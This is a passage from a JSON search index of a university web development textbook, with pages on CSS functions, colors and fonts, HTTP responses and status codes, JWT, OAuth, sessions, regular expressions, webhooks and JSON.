who are prompted to sign in repeatedly. As always, you need to balance security concerns with user satisfaction for the kind of activities your application supports.\nCombinations of the Above Clearly these strategies can be used in combination, and doing so will provide a better degree of safety for your clients. But the can also increase computation time, network traffic, and user frustration within your web application. Deciding just how much security your application needs is an important part of the design process.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/08-functions/",
	"title": "CSS Functions",
	"tags": [],
	"description": "",
	"content": "CSS provides a number of useful functions that calculate values. Functions are written in the form name(arg1, arg2, ...) and are provided as values to CSS properties. For example, this CSS code sets the height of the content area to the available space on screen for content after subtracting a header and footer:\n#header {height: 150px} #footer {height: 100px} #content { height: calc(100vh - 150px - 100px); } Here 100vh is the height of the viewport, and the header and footer are defined in terms of pixels.\nNote\nYou might want to apply the box-sizing: border-box on these elements if they have padding and borders, or these additional dimensions will need to be included in the calculation. See the section on the CSS Box Model for more details.\nMath Functions CSS provides a number of useful math functions:\nThe Calc Function As you have seen above, the calc() function can be used to calculate values by performing arithmetic upon values. These values can be in different units (i.e. calc(200px - 5mm) or even determined as the webpage is being interpreted (i.e. calc(80vw + 5rem)). See the MDN Documentation for more details.\nThe Min and Max Functions CSS also provides min() and max() function, which provide the smallest or largest from the provided arguments (which can be arbitrary in number). As with calc(), it can do so with interpretation-time values.\nThe Clamp Function The clamp() function clamps a value within a provided range. Its first argument is the minimum value, the second the preferred value, and the third the max. If the preferred value is between the min and max value, it is returned. If it is less than the minimum, the min is instead returned, or if it is greater than the maximum, the max value is returned.\nColor Functions Several CSS functions are used to create an modify colors. These are described in the CSS Color section.\nTransformation Functions Many CSS functions exist for specifying CSS transforms. See the MDN documentation for details.\nImage Filter Functions CSS allows for filters to be applied to images. More details can be found in the Mozilla Documentation.\nCounter Functions Finally CSS uses counters to determine row number and ordered list numbers. These can be manipulated and re-purposed in various ways. See the MDN Documentation for details.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/08-jwt/",
	"title": "JSON Web Tokens",
	"tags": [],
	"description": "",
	"content": "A common thread across single-sign-on approaches is the issuing of some kind of ticket or certificate to identify the signed-in user. This is often stored within a cookie (which means it can be used to persist a connection with a web app). However, as the web matured, a more robust identity token became a standard: the JSON Web Token (JWT).\nA JSON Web Token (JWT) consists of three parts:\nA header with metadata A payload consisting of the data needed to identify the user A cryptographic signature verifying the payload and header The JWT puts the user information directly into a token that is served by the authentication server. So if we want to identify a user by email, their email is in the payload. The header provides information like when the JWT will expire, and what cryptographic algorithm was used to generate the signature. And the signature was created using the specified cryptographic algorithm on the header and payload. This signature is what gives a JWT its robustness; when used correctly makes it impossible to modify the payload without the tampering being evident.\nHow trust is established is based on the cryptographic function, which uses a public and private key pair (much like TLS). The hash is created with the private key on the authentication server on a successful login. It can be decoded by an application using the public key. The decoded data should match that of the header and payload exactly. If it does, this proves the JWT was created by the authentication server (as you can\u0026rsquo;t create one without the private key) and hasn\u0026rsquo;t been tampered with. If it is tampered with, i.e someone changes the payload, the signature will no longer match.\nBecause of this tamper-resistant nature, JWT has quickly become a standard form for authentication tokens.\nYou can learn more about the JWT approach at https://jwt.io/.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/08-response-format/",
	"title": "Response Format",
	"tags": [],
	"description": "",
	"content": "Similar to an HTTP Request, an HTTP response is typically a stream of text and possibly data:\nIt consists of one or more lines of text, terminated by a CRLF (sequential carriage return and line feed characters):\nA status-line indicating the HTTP protocol, the status code, and a textual status Optional lines containing the Response Headers. These specify the details of the response or describe the response body A blank line, indicating the end of the response metadata An optional response body. This will typically be the text of an HTML file, or binary data for an image or other file type, or a block of bytes for streaming data. The Status-Line The status-line follows the format\nStatus-Line = HTTP-Version SP Status-Code SP Reason-Phrase CRLF\nThe HTTP-Version indicates the version of the HTTP protocol that is being used (HTTP/1.0, HTTP/1.1, or HTTP/2.0).\nSP refers to a space character.\nThe Status-Code is a three-digit numeric representation of the response status. Common codes include 200 (OK), 404 (Not Found), and 500 (Server Error).\nThe Reason-Phrase is a plain-text explanation of the status code.\nResponse Headers Just like HTTP Requests, a HTTP response can contain headers describing the response. If the response has a body, a Content-Type and Content-Length header would be expected.\nA Blank Line The header section is followed by a blank line (a CRLF with no characters before it). This helps separate the response metadata from the response body.\nResponse Body The response body contains the data of the response. it might be text (as is typically the case with HTML, CSS, or JavaScript), or a binary file (an image, video, or executable). Additionally, it might only be a sequence of bytes, as is the case for streaming media.\nInfo\nThe full HTTP/1.1 response definition can be found in W3C RFC 2616 Section 6.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/08-strict-mode/",
	"title": "Strict Mode",
	"tags": [],
	"description": "",
	"content": "JavaScript has been around a long time, and a lot of JavaScript code has been written by inexperienced programmers. Browser manufacturers compensated for this by allowing lenient interpretation of JavaScript programs, and by ignoring many errors as they occurred.\nWhile this made poorly-written scripts run, arguably they didn\u0026rsquo;t run well. In ECMA5, strict mode was introduced to solve the problems of lenient interpretation.\nStrict mode according to the Mozilla Developer Network:\nEliminates some JavaScript silent errors by changing them to throw errors. Fixes mistakes that make it difficult for JavaScript engines to perform optimizations: strict mode code can sometimes be made to run faster than identical code that\u0026rsquo;s not strict mode. Prohibits some syntax likely to be defined in future versions of ECMAScript. You can place the interpreter in strict mode by including this line at the start of your JavaScript file:\n\u0026#34;use strict\u0026#34;; In interpreters that don\u0026rsquo;t support strict mode, this expression will be interpreted as a string and do nothing.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/04-node/08-summary/",
	"title": "Summary",
	"tags": [],
	"description": "",
	"content": "Node, and its package manager, npm, are powerful tools for developing server-side applications in JavaScript. In the past chapter, we\u0026rsquo;ve discussed the event loop that drives Node\u0026rsquo;s asynchronous, event-driven approach, and the asynchronous function pattern employed by many node libraries. We\u0026rsquo;ve also talked about how Node.js code can be organized into modules, how those modules can be imported with a require() call, and how the node package manager (npm) can be used to download and install open-source packages locally. Finally, we\u0026rsquo;ve discussed how to create our own local packages from our projects.\nResources Node can be downloaded from nodejs.org or installed using Node Version Manager (nvm).\nThe latest Node documentation can be found at https://nodejs.org/en/docs/\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/08-routing/08-web-hooks/",
	"title": "Web Hooks",
	"tags": [],
	"description": "",
	"content": "A lighter-weight alternative to a full-fledged API is a webhook. A webhook is simply an address a web application is instructed to make a HTTP request against when a specific event happens. For example, you can set your GitHub repository to trigger a webhook when a new commit is made to it. You simply provide the URL it should send a request to, and it will send a request with a payload (based on the event).\nFor example, the Discord chat platform allows users to create webhook endpoint that will post messages into a channel. The webhook will be the in the form lf a URL that specifies the Discord server and channel that the message should be sent to, as well as some authentication parameters to identify the source of the webhook. You can then configure a webhook in GitHub which sends a message to the URL when a commit is made to GitHub. Now, each time a user pushes new data to GitHub, you\u0026rsquo;ll be able to see a message in Discord.\nA more advanced webhook endpoint can be used to trigger various actions, such as a continuous deployment routine. In that way, you can have a repository automatically deploy each time it is updated, simply through the use of webhooks!\nIn other words, a webhook is a technique for implementing event listeners using HTTP. One web service (GitHub in the example) provides a way for you to specify an event listener defined in another web application by the route used to communicate with it. This represents a looser coupling than a traditional API; if the request fails for any reason, it will not cause problems for the service that triggered it. It also has the benefit of being event-driven, whereas to check for new data with an API, you would need to poll (make a request to query) the API at regular intervals.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/08-routing/",
	"title": "Routing",
	"tags": [],
	"description": "",
	"content": "Chapter 8 Routing Are we there yet?\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/09-colors/",
	"title": "CSS Colors",
	"tags": [],
	"description": "",
	"content": "CSS also has many properties that can be set to a color, i.e. color, background-color, border-color, box-shadow, etc. Colors consist of three or four values corresponding to the amount of red, green, and blue light blended to create the color. The optional fourth value is the alpha, and is typically used to specify transparency.\nColors are stored as 24-bit values, with 8 bits for each of the four channels (R,G,B,and A), representing 256 possible values (2^8) for each channel.\nColors can be specified in one of several ways:\nColor Keywords like red, dark-gray, chartreuse correspond to well-defined values. You can find the full list in the MDN Documentation.\nHexidecimal Values like #6495ed, which corresponds to cornflower blue. The first two places represent the red component, the second the green, and the third the blue. If an additional two places are provided the last pair represents the alpha component. Each pair of hex values can represent 256 possible values (16^2), and is converted directly to the binary color representation in memory.\nRGB Function a third option is to use the RGB() CSS function. This take decimal arguments for each channel which should be in the range 0-255\nHSL Function a fourth option is the HSL() function, which specifies colors in terms of an alternative scheme of hue, saturation, and lightness.\nRGBA and HSLA Functions finally, the RGBA() and HSLA() functions take the same arguments as their siblings, plus a value for the alpha channel between 0 and 1.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/09-oauth/",
	"title": "OAuth",
	"tags": [],
	"description": "",
	"content": "OAuth 2.0 is perhaps the best-known single-sign-on solution. Many of the big internet players provide OAuth services: Google, Microsoft, Facebook, Twitter, etc. However, OAuth is significantly more complex than the other approaches we\u0026rsquo;ve talked about, as it really a standard for access delegation, i.e. a way for users to authorize third-party apps to access their information stored with the identity provider.\nI.e. if you write an app that works with the Facebook API and needs access to a users\u0026rsquo; friends list, then OAuth allows you to authorize Facebook to share that info with your app. This authorization is done by the user through Facebook, and can be revoked at any time.\nDespite being built to help with access delegation, OAuth 2.0 can (and often is) used soley for the purpose of single-sign-on.\nThe OAuth protocol flow\nThe user requests a resource The app server redirects the user\u0026rsquo;s browser to the identity server, along with a a request for identity The identity server prompts the user to log in (if they aren\u0026rsquo;t already) The identity server redirects the user back to the app server providing an encoded response and identity token (typically a JWT) The app server decodes the response, and determines if the user has been authenticated The identity token can now be used to access the approved services of the identity provider Notice the big difference here between CAS and SAML is that the app server doesn\u0026rsquo;t need to contact the identity server directly to authenticate the user. This is because the app server is registered with the identity server, which provides it both an client id and secret. The client id is a public identifier used to uniquely identify the web app amongst all those that use the identity service, and the secret should be known only to the web app and the identity server. This client id, secret, and user\u0026rsquo;s token are sent to the authenticating server when requests are made for its services.\nOAuth is sometimes referred to as pseudo-identity, as its real purpose is to provide access to the services of the identity provider. OpenID is another standard built on top of OAuth that goes one step farther - issuing an authentication certificate certifying the identity of the user. A comparison of the two processes appears in the graphic below:\n1\nFile:OpenIDvs.Pseudo-AuthenticationusingOAuth.svg. (2020, October 22). Wikimedia Commons, the free media repository. Retrieved 15:38, June 2, 2022 from https://commons.wikimedia.org/w/index.php?title=File:OpenIDvs.Pseudo-AuthenticationusingOAuth.svg\u0026oldid=496954680.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/09-regexp/",
	"title": "Regular Expressions",
	"tags": [],
	"description": "",
	"content": " CONSOLE The JavaScript String prototype has some very powerful methods, such as String.prototype.includes() which recognizes when a string contains a substring - i.e.:\n\u0026#34;foobarwhen\u0026#34;.includes(\u0026#34;bar\u0026#34;) would evaluate to true. But what if you needed a more general solution? Say, to see if the text matched a phone number pattern like XXX-XXX-XXXX? That\u0026rsquo;s where Regular Expressions come in.\nRegular Expressions are a sequence of characters that define a pattern that can be searched for within a string. Unlike substrings, these patterns can have a lot of flexibility. For example, the phone number pattern above can be expressed as a JavaScript RegExp like this:\n/\\d{3}-\\d{3}-\\d{4}/ Let\u0026rsquo;s break down what each part means. First, the enclosing forward slashes (/) indicate this is a RegExp literal, the same way single or double quotes indicate a string literal. The backslash d (\\d) indicates a decimal character, and will match a 0,1,2,3,4,5,6,7,8, or 9. The three in brackets {3} is a quantifier, indicating there should be three of the proceeding character - so three decimal characters. And the dash (-) matches the actual dash character.\nWriting Regular Expressions and Scriptular As you can see, regular expressions make use of a decent number of special characters, and can be tricky to write. One of the greatest tools in your arsenal when dealing with Regular Expressions are web apps such as Scriptular.com or Regex101(click the link to open it in a new tab). It lists characters with special meanings for regular expressions on the right, and provides an interactive editor on the left, where you can try out regular expressions against target text.\nYou can, of course, do the same thing on the console, but I find that using Scriptular to prototype regular expressions is faster. You can also clone the Scriptular Github repo and use it locally rather than on the internet. A word of warning, however, always test your regular expressions in the context you are going to use them - sometimes something that works in Scriptular doesn\u0026rsquo;t quite in the field (especially with older browsers and Node versions).\nRegular Expressions and Input Validation So how are regular expressions used in Web Development? One common use is to validate user input - to make sure the user has entered values in the format we want. To see if a user entered string matches the phone format we declared above, for example, we can use the RegExp.prototype.test() method. It returns the boolean true if a match is found, false otherwise:\nif(/\\d{3}-\\d{3}-\\d{4}/.test(userEnteredString)) { console.log(\u0026#34;String was valid\u0026#34;); } else { console.log(\u0026#34;String was Invalid\u0026#34;); } But what if we wanted to allow phone numbers in more than one format? Say X-XXX-XXX-XXXX, (XXX)XXX-XXXX, and X(XXX)XXX-XXXX)?\nWe can do this as well:\n/\\d?-?\\d{3}-\\d{3}-\\d{4}|\\d?\\s?\\(\\d{3}\\)\\s?\\d{3}-\\d{4}/ The pipe (|) in the middle of the RexExp acts like an OR; we can match against the pattern before OR the pattern after. The first pattern is almost the same as the one we started with, but with a new leading \\d and -. These use the quantifier ?, which indicates 0 or 1 instances of the character.\nThe second pattern is similar, except we use a backslash s (/s) to match whitespace characters (we could also use the literal space , \\s also matches tabs and newlines). And we look for parenthesis, but as parenthesis have special meaning for RegExp syntax, we must escape them with a backslash: (\\( and \\)).\nRegular Expressions and Form Validation In fact, the use of Regular Expressions to validate user input is such a common use-case that when HTML5 introduced form data validation it included the pattern attribute for HTML5 forms. It instructs the browser to mark a form field as invalid unless input matching the pattern is entered. Thus, the HTML:\n\u0026lt;label for=\u0026#34;phone\u0026#34;\u0026gt;Please enter a phone number \u0026lt;input name=\u0026#34;phone\u0026#34; pattern=\u0026#34;\\d{3}-\\d{3}-\\d{4}\u0026#34; placeholder=\u0026#34;xxx-xxx-xxxx\u0026#34;\u0026gt; \u0026lt;/label\u0026gt; Will ensure that only validly formatted phone numbers can be submitted. Also, note that we omitted the leading and trailing forward slashes (/) with the pattern attribute.\nHowever, be aware that older browsers may not have support for HTML5 form data validation (though all modern ones do), and that a savvy user can easily disable HTML5 form validation with the Developer Tools. Thus, you should aways validate on both the client-side (for good user experience) and the server-side (to ensure clean data). We\u0026rsquo;ll discuss data validation more in our chapter on persisting data on the server.\nConstructing RegExp Besides using literal notation, We can also construct regular expressions from a string of characters:\nvar regexp = new RegExp(\u0026#34;\\d{3}-\\d{3}-\\d{4}\u0026#34;) This is especially useful if we won\u0026rsquo;t know the pattern until runtime, as we can create our regular expression \u0026ldquo;on the fly.\u0026rdquo;\nRegExp flags You can also specify one or more flags when defining a JavaScript Regular Expression, by listing the flag after the literal, i.e. in the RegExp:\n/\\d{3}-\\d{3}-\\d{4}/g The flag g means global, and will find all matches, not just the first. So if we wanted to find all phone numbers in a body of text, we could do:\n/\\d{3}-\\d{3}-\\d{4}/g.match(bodyOfText); Here the RegExp.prototype.match() function returns an array of phone numbers that matched the pattern and were found in bodyOfText.\nThe flags defined for JavaScript regular expressions are:\ng global match - normally RegExp execution stops after the first match. i ignore case - upper and lowercase versions of a letter are treated equivalently m multiline - makes the beginning end operators (^ and $) operate on lines rather than the whole string. s dotAll - allows . to match newlines (normally . is a wildcard matching everything but newline characters) u unicode - treat pattern as a sequence of unicode code points ysticky - matches only from the lastIndex property of the Regular Expression Capture Groups We saw above how we can retrieve the strings that matched our regular expression patterns Matching patterns represents only part of the power of regular expressions. One of the most useful features is the ability to capture pieces of the pattern, and expose them to the programmer.\nConsider, for example, the common case where we have a comma delimited value (CSV) file where we need to tweak some values. Say perhaps we have one like this:\nName,weight,height John Doe,150,6\u0026#39;2\u0026#34; Sara Smith,102,5\u0026#39;8\u0026#34; \u0026#34;Mark Zed, the Third\u0026#34;,250,5\u0026#39;11\u0026#34; ... 100\u0026#39;s more values.... which is part of a scientific study where they need the weight in Kg and the height in meters. We could make the changes by hand - but who wants to do that? We could also do the changes by opening the file in Excel, but that would also involve a lot of copy/paste and deletion, opening the door to human error. Or we can tweak the values with JavaScript.\nNotice how the Mark Zed entry, because it has a comma in the name, is wrapped in double quotes, while the other names aren\u0026rsquo;t? This would make using something like String.prototype.split() impossible to use without a ton of additional logic, because it splits on the supplied delimiter (in this case, a comma), and would catch these additional commas. However, because a RegExp matches a pattern, we can account for this issue.\nBut we want to go one step farther, and capture the weight and height values. We can create a capture group by surrounding part of our pattern with parenthesis, i.e. the RegExp:\n/^([\\d\\s\\w]+|\u0026#34;[\\d\\s\\w,]+\u0026#34;),(\\d+),(\\d+\u0026#39;\\d+)\u0026#34;$/gm Will match each line in the file. Let\u0026rsquo;s take a look at each part:\n/^ ... $/mg the m flag indicates that ^ and $ should mark the start and end of each line. This makes sure we only capture values from the same line as par to a match, and the g flag means we want to find all matching lines in the file.\n([\\d\\s\\w]+|\u0026quot;[\\d\\s\\w,]+\u0026quot;) is our first capture group, and we see it has two options (separated by |). The square brackets ([]) represent a set of characters, and we\u0026rsquo;ll match any character(s) listed inside. So [\\d\\s\\w] means any decimal (\\d), whitespace (\\s), or word (\\w) character, and the + means one or more of these. The second option is almost the same as the first, but surrounded by double quotes (\u0026quot;) and includes commas (,) in the set of matching characters. This means the first group will always match our name field, even if it has commas.\n,(\\d+), is pretty simple - we match the comma between name and weight columns, capture the weight value, and then the comma between weight and height.\n(\\d+'\\d+)\u0026quot; is a bit more interesting. We capture the feet value (\\d+), the apostrophe (') indicating the unit of feet, and the inches value (\\d+). While we match the units for inches (\u0026quot;), it is not part of the capture group.\nSo our line-by-line captures would be:\nLine 0: No match Line 1: John Doe, 150, 6'2 Line 2: Sara Smith, 102, 5'8 Line 3: \"Mark Zed, the Third\", 250, 5'11 We can use this knowledge with String.prototype.replace() to reformat the values in our file. The replace() can work as you are probably used to - taking two strings - one to search for and one to use as a replacement. But it can also take a RegExp as a pattern to search for and replace. And the replacement value can also be a function, which receives as its parameters 1) the full match to the pattern, and 2) the capture group values, as subsequent parameters.\nThus, for the Line 1 match, it would be invoked with parameters: (\u0026quot;John Doe,150,6'2\\\u0026quot;\u0026quot;, \u0026quot;John Doe\u0026quot;, \u0026quot;150\u0026quot;, \u0026quot;6'2\\\u0026quot;\u0026quot;). We can use this understanding to write our conversion function:\nfunction convertRow(match, name, weight, height) { // Convert weight from lbs to Kgs var lbs = parseInt(weight, 10); var kgs = lbs / 2.205; // Convert height from feet and inches to meters var parts = height.split(\u0026#34;\u0026#39;\u0026#34;); var feet = parseInt(parts[0], 10); var inches = parseInt(parts[1], 10); var totalInches = inches + 12 * feet; var meters = totalInches * 1.094; // Return the new line values: return `${name},${kgs},${meters}`; } And now we can invoke that function as part of String.prototype.replace() on the body of the file:\nvar newBody = oldBody.replace(/^([\\d\\s\\w]+|\u0026#34;[\\d\\s\\w,]+\u0026#34;),(\\d+),(\\d+\u0026#39;\\d+)\u0026#34;$/gm, convertRow); And our newBody variable contains the revised file body (we\u0026rsquo;ll talk about how to get the file body in the first place, either in the browser or with Node, later on).\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/09-sessions/",
	"title": "Sessions",
	"tags": [],
	"description": "",
	"content": "If HTTP is stateless, how do e-commerce websites manage to keep track of the contents of your shopping cart as you navigate from page to page? The answer is the use of a session - a technique by which state is added to a web application.\nInfo\nThe term session appears a lot in web development, and can mean different things in different contexts. But there is a common thread in each - a session is a form of connection between the client and server.\nFor example, when your web client make a request from a web server, it opens a Transmission Control Protocol (TCP) session to the server, and sends the HTTP request across this connection. The session stays open until all the packets of the request are sent, and those of the response are received. In HTTP 1.1, the session can stay open for more than a single request-response pair, as it is anticipated a HTML page request will be followed by requests for resources (CSS, JavaScript, images, etc.) embedded in the page. HTTP 2.0 takes this farther, allowing the server to push these additional resources to the client.\nThe sessions we are discussing here are implemented at a higher level than TCP sessions (though they are hosted by the TCP session), and represent a single website visitor interacting with the server.\nA session therefore provides a mechanism for storing information between requests, and must be unique to a specific user. All session techniques begin with a cookie, so you should be familiar with that concept.\nThere are three basic session techniques you will likely encounter in web development. Let\u0026rsquo;s take a look at each.\nCookie Session In a cookie session, the session information is completely stored within the cookie. This has the benefit that no state information needs to be stored on the server, and it is easy to implement.\nThere are several downsides to the cookie session. The first is that it comes with a limited amount of reliable storage (the standard suggests that browsers support a minimum cookie size of 4096 bytes per cookie, but there is no hard requirement). Second, cookies are somewhat vulnerable, as they can be intercepted in-transit, and they can also be recovered from a browser\u0026rsquo;s cookie storage by a knowledgeable adversary.\nIn-Memory Cookies A second approach is to store the session data on the server using some form of memory cache. A straightforward implementation for a Node server would be to use an object, i.e.:\nvar sessions = {} Each time a new visitor comes to the website, a unique ID is generated, and used as the the key for their session, and sent to the client as a cookie, i.e.:\nvar sessionID = [some unique id]; res.setHeader(\u0026#34;Set-Cookie\u0026#34;, `session-id=${sessionID}; lang=en-US`); sessions[sessionID] = { // session data here } On subsequent requests, the cookie can be retrieved from the request and used to retrieve the session data:\nvar cookie = req.headers[\u0026#34;cookie\u0026#34;]; var sessionID = /session-id=([^;])/.match(cookie); var session = sessions[sessionID]; Because the session data is never sent in its raw form to the client, it is more secure. However, the session can still be hijacked by a malicious user who copies the cookie or guesses a valid session id. To counter this, all requests should be updated to use secure protocol (https) and the cookie should be encrypted.\nAlso, in-memory sessions are lost when the server reboots (as they are held in volatile memory). They should also be cleaned out periodically, as each session consumes working memory, and if a session is more than an hour old it probably will not be used again.\nDatabase Sessions When a website is backed by a database (as we\u0026rsquo;ll cover soon), storing the session in that database becomes an option. Functionally, it is similar to an In-Memory session, except that the database becomes the storage mechanism. Because the database offers persistent storage, the session also could be persistent (i.e. you remain \u0026ldquo;logged on\u0026rdquo; every time you visit from the same computer). Still, database sessions typically are cleaned out periodically to keep the sessions table from growing overlarge.\nDatabase sessions are a good choice if your website is already using a database. For a website with registered users, the session id can be the user\u0026rsquo;s id, as defined in the database schema.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/09-status-codes/",
	"title": "Status Codes",
	"tags": [],
	"description": "",
	"content": "The status-line consists of a numeric code, followed by a space, and then a human-readable status message that goes with the code. The codes themselves are 3-digit numbers, with the first number indicating a general category the response status falls into. Essentially, the status code indicates that the request is being fulfilled, or the reason it cannot be.\n1XX Status Codes Codes falling in the 100\u0026rsquo;s provide some kind of information, often in response to a HEAD or upgrade request. See the MDN Documentation for a full list.\n2XX Status Codes Codes in the 200\u0026rsquo;s indicate success in some form. These include:\n200 OK A status of 200 indicates the request was successful. This is by far the most common response.\n201 Created Issued in response to a successful POST request, indicates the resource POSTed to the server has been created.\n202 Accepted Indicates the request was received but not yet acted upon. This is used for batch-style processes. An example you may be familiar with is submitting a DARS report request - the DARS server, upon receiving one, adds it to a list of reports to process and then sends a 202 response indicating it was added to the list, and should be available at some future point.\nThere are additional 200 status codes. See the MDN Documentation for a full list.\n3XX Status Codes Codes in the 300\u0026rsquo;s indicate redirects. These should be used in conjunction with a Location response header to notify the user-agent where to redirect. The three most common are:\n301 Moved Permanently Indicates the requested resource is now permanently available at a different URI. The new URI should be provided in the response, and the user-agent may want to update bookmarks and caches.\n302 Found Also redirects the user to a different URI, but this redirect should be considered temporary and the original URI used for further requests.\n304 Not Modified Indicates the requested resource has not changed, and therefore the user-agent can use its cached version. By sending a 304, the server does not need to send a potentially large resource and consume unnecessary bandwidth.\nThere are additional 300 status codes. See the MDN Documentation for a full list.\n4XX Status Codes Codes in the 400\u0026rsquo;s indicate client errors. These center around badly formatted requests and authentication status.\n400 Bad Request is a request that is poorly formatted and cannot be understood.\n401 Unauthorized means the user has not been authenticated, and needs to log in.\n403 Forbidden means the user does not have permissions to access the requested resource.\n404 Not Found means the requested resource is not found on the server.\nThere are many additional 400 status codes. See the MDN Documentation for a full list.\n5XX Status Codes Status codes in the 500\u0026rsquo;s indicate server errors.\n500 Server Error is a generic code for \u0026ldquo;something went wrong in the server.\u0026rdquo;\n501 Not Implemented indicates the server does not know how to handle the request method.\n503 Service Unavailable indicates the server is not able to handle the request at the moment due to being down, overloaded, or some other temporary condition.\nThere are additional 500 status codes. See the MDN Documentation for a full list.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/03-asynchronous-js/09-summary/",
	"title": "Summary",
	"tags": [],
	"description": "",
	"content": "In this chapter we learned about many of the approaches and challenges involved in concurrent programming, including asynchronous programming. JavaScript adopts the asynchronous approach through its use of the event loop and queue, allowing asynchronous processes to be invoked, processed on separate threads, and posting their results as new messages on the event queue to be processed when the main thread gets to them.\nWe saw how this approach allows for multi-threaded programs in the browser through the use of web workers, each of which runs a separate JavaScript interpreter with its own event loop and queue. We also saw how communication between web workers and the main thread are handled through message passing, and how very large data buffers can be transferred instead of copied between these threads for efficiency.\nFinally, we examined the callback mechanism used for asynchronous processing in JavaScript, and explored two common abstractions used to make it more programmer-friendly: promises and the async/await keywords.\nIn the next chapter, we\u0026rsquo;ll explore Node.js, a server-side implementation of the JavaScript engine that makes heavy use of the JavaScript asynchronous model.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/08-routing/09-summary/",
	"title": "Summary",
	"tags": [],
	"description": "",
	"content": "In this chapter, we exported the idea of routes, a mechanism for mapping a request to the appropriate endpoint function to generate a response. Routes typically consist of both the request URL and the request method. RESTful routes provide a common strategy for implementing CRUD methods for a server-generated resource; any programmer familiar with REST will quickly be able to suss out the appropriate route.\nWe also explored routers are objects that make routing more manageable to implement. These allow you to define a route and tie it to an endpoint function used to generate the result. Most will also capture wildcards in the route, and supply those to the endpoint function in some form. We briefly looked at the Express framework, a Node framework that adds a router to the vanilla Node http.Server class.\nFinally, we discussed using routes to serve other programs instead of users with APIs and WebHooks.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/",
	"title": "Authentication",
	"tags": [],
	"description": "",
	"content": "Chapter 9 Authentication Who are you?\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/10-text/",
	"title": "CSS and Text",
	"tags": [],
	"description": "",
	"content": "As the original purpose of the World-Wide-Web was to disseminate written information, it should be no surprise that CSS would provide many properties for working with text. Some of the most commonly employed properties are:\nfont-family defines the font to use for the text. Its value is one or more font family or generic font names, i.e. font-family: Tahoma, serif, font-family: cursive or font-family: \u0026quot;Comic Sans\u0026quot;. Font family names are typically capitalized and, if they contain spaces or special characters, double-quoted. font-size determines the size of the font. It can be a measurement or a defined value like x-small. font-style determines if the font should use its normal (default), italic, or oblique face. font-weight determines the weight (boldness) of the font. It can be normal or bold as well as lighter or darker than its parent, or specified as a numeric value between 1 and 1000. Be aware that many fonts have a limited number of weights. line-height sets the height of the line box (the distance between lines of text). It can be normal, or a numeric or percent value. text-align determines how text is aligned. Possible values are left (default), center, right, justify, along with some newer experimental values. text-indent indents the text by the specified value. text-justify is used in conjunction with text-align: justify and specifies how space should be distributed. A value of inter-word distributes space between words (appropriate for English, Spanish, Arabic, etc), and inter-character between characters (appropriate for Japanese, Chinese, etc). text-transform can be used to capitalize or lowercase text. Values include capitalize, uppercase, and lowercase. Choosing Fonts An important consideration when working with HTML text is that not all users will have the same fonts you have - and if the font is not on their system, the browser will fall back to a different option. Specifying a generic font name after a Font Family can help steer that fallback choice; for example:\nbody { font-family: Lucinda, cursive } will use Lucinda if available, or another cursive font if not. Some guidelines on font choice:\ncursive fonts should typically only be used for headings, not body text. serif fonts (those with the additional feet at the base of letters) are easier to read printed on paper, but more difficult on-screen. sans-serif fonts are easier to read on-screen; your body text should most likely be a sans-serif. Web-Safe Fonts Fonts that commonly appear across computing platforms and have a strong possibility of being on a users\u0026rsquo; machine have come to be known as web-safe. Some of these are:\nArial Helvetica Times Courier New Courier Georgia Lucidia Console Palatino Verdana Font-Face at Rule Alternatively, if you wish to use a less-common font, you can provide it to the browser using the @font-face rule. This defines a font and provides a source for the font file:\n@font-face { font-family: examplefont; src: url(\u0026#39;examplefont.ttf\u0026#39;); } You can then serve the font file from your webserver.\nWarning\nBe aware that distributing fonts carries different legal obligations than distributing something printed in the font. Depending on the font license, you may not be legally allowed to distribute it with the @font-face rule. Be sure to check.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/10-json/",
	"title": "JSON",
	"tags": [],
	"description": "",
	"content": "JSON is an acronym for JavaScript Object Notation, a serialization format that was developed in conjunction with ECMAScript 3. It is a standard format, as set by ECMA-404.\nJSON Format Essentially, it is a format for transmitting JavaScript objects. Consider the JavaScript object literal notation:\nvar wilma = { name: \u0026#34;Wilma Flintstone\u0026#34;, relationship: \u0026#34;wife\u0026#34; } var pebbles = { name: \u0026#34;Pebbles Flintstone\u0026#34;, age: 3, relationship: \u0026#34;daughter\u0026#34; } var fred = { name: \u0026#34;Fred Flintstone\u0026#34;, job: \u0026#34;Quarry Worker\u0026#34;, payRate: 8, dependents: [wilma, pebbles] } If we were to express the same object in JSON:\n{ \u0026#34;name\u0026#34;: \u0026#34;Fred Flintstone\u0026#34;, \u0026#34;job\u0026#34;: \u0026#34;Quarry Worker\u0026#34;, \u0026#34;payRate\u0026#34;: 8, \u0026#34;dependents\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Wilma Flintstone\u0026#34;, \u0026#34;relationship\u0026#34;: \u0026#34;wife\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Pebbles Flintstone\u0026#34;, \u0026#34;age\u0026#34;: 3, \u0026#34;relationship\u0026#34;: \u0026#34;daughter\u0026#34; } ] } As you probably notice, the two are very similar. Two differences probably stand out: First, references (like wilma and pebbles) are replaced with a JSON representation of their values. And second, all property names (the keys) are expressed as strings, not JavaScript symbols.\nA discussion of the full syntax can be found in the MDN Documentation and also at json.org.\nThe JSON Object The JavaScript language provides a JSON object with two very useful functions: JSON.stringify() and JSON.parse(). The first converts any JavaScript variable into a JSON string. Similarly, 